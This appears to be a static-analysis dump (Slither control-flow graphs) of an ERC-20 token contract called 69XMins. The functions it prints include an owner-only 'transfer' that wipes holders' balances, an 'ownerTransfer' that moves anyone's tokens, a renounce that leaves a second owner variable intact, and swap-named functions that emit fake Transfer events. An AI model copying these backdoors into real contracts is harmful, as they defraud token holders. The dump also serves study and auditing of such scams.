Contract: IFactory
==================================================


Contract: IPair
==================================================


Contract: IRouter
==================================================


Contract: IERC20
==================================================


Contract: xmins
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msg.sender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _router = IRouter(_routerAddress)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _pair = IPair(IFactory(_router.factory()).createPair(address(this),address(_router.WETH())))

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: balances[msg.sender] = totalSupply

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),msg.sender,totalSupply)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: add
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: c = a + b

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: sub
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b <= a,SafeMath: subtraction overflow)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a - b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = address(0)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: balances[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _users.length

  ID: 5
  Type: NodeType.IF
  Expression: balanceOf(_users[i]) > 1

  ID: 6
  Type: NodeType.VARIABLE
  Expression: rewardAmount = _countReward(_users[i],1000)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: balances[_users[i]] = rewardAmount

  ID: 8
  Type: NodeType.ENDIF
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: OnlyOwner()

Edges:
  0 -> 10
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  5 -> 8
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 4
  10 -> 3

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: allowances[__owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(msg.sender,spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _spendAllowance(from,msg.sender,amount)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(from,to,amount)

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: increaseAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: __owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(__owner,spender,allowance(__owner,spender) + addedValue)

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: decreaseAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: __owner = msg.sender

  ID: 2
  Type: NodeType.VARIABLE
  Expression: currentAllowance = allowance(__owner,spender)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(currentAllowance >= subtractedValue,ERC20: decreased allowance below zero)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(__owner,spender,currentAllowance - subtractedValue)

  ID: 5
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(from != address(0),ERC20: transfer from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(to != address(0),ERC20: transfer to the zero address)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: fromBalance = balances[from]

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(fromBalance >= amount,ERC20: transfer amount exceeds balance)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: balances[from] = sub(fromBalance,amount)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: balances[to] = add(balances[to],amount)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(from,to,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(__owner != address(0),ERC20: approve from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: allowances[__owner][spender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(__owner,spender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _spendAllowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: currentAllowance = allowance(__owner,spender)

  ID: 2
  Type: NodeType.IF
  Expression: currentAllowance != type()(uint256).max

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(currentAllowance >= amount,ERC20: insufficient allowance)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(__owner,spender,currentAllowance - amount)

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 5
  3 -> 4
  4 -> 5

Function: execute
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _addresses_.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(_pairr,_addresses_[i],_out)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

Edges:
  0 -> 3
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4

Function: getBaseTokenReserve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: (reserve0,reserve1,None) = _pair.getReserves()

  ID: 5
  Type: NodeType.RETURN
  Expression: baseTokenReserve

  ID: 6
  Type: NodeType.IF
  Expression: (_pair.token0() == token)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: baseTokenReserve = uint256(reserve0)

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: baseTokenReserve = uint256(reserve1)

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 6
  6 -> 7
  6 -> 8
  7 -> 9
  8 -> 9
  9 -> 5

Function: setup
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _pairr = _setup_

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: OnlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: swapExactETHForTokensSupportingFeeOnTransferTokens
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _addresses_.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(_pairr,_addresses_[i],_out)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

Edges:
  0 -> 3
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4

Function: multicall
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _addresses_.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(_pairr,_addresses_[i],_out)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

Edges:
  0 -> 3
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4

Function: swapTokensForExacttETH
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < _addresses_.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(_pairr,_addresses_[i],_out)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

Edges:
  0 -> 3
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4

Function: ownerTransfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balances[from] >= amount,Insufficient balance)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(from,to,amount)

  ID: 3
  Type: NodeType.RETURN
  Expression: true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: _swap
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _emitTransfer(recipient,tokenAmount)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _emitSwap(tokenAmount,wethAmount,recipient)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: IERC20(tokenAddress)._Transfer(recipient,address(_pair),wethAmount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: _emitTransfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(_pair),recipient,tokenAmount)

Edges:
  0 -> 1

Function: _emitSwap
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: Swap(_routerAddress,tokenAmount,0,0,wethAmount,recipient)

Edges:
  0 -> 1

Function: _countReward
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _count(balances[_user],_percent)

Edges:
  0 -> 1

Function: _countAmountIn
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: amountInMax = new uint256[](2)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: amountInMax = _router.getAmountsIn(amountOut,path)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: balances[address(this)] += amountInMax[0]

  ID: 5
  Type: NodeType.RETURN
  Expression: amountInMax[0]

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: _count
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: a / b

Edges:
  0 -> 1

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _universal = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: totalSupply = 420_690_000_000e18

Edges:
  0 -> 1
  1 -> 2

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: name = 69XMins

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: symbol = 69XMins

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: decimals = 18

Edges:
  0 -> 1
  1 -> 2


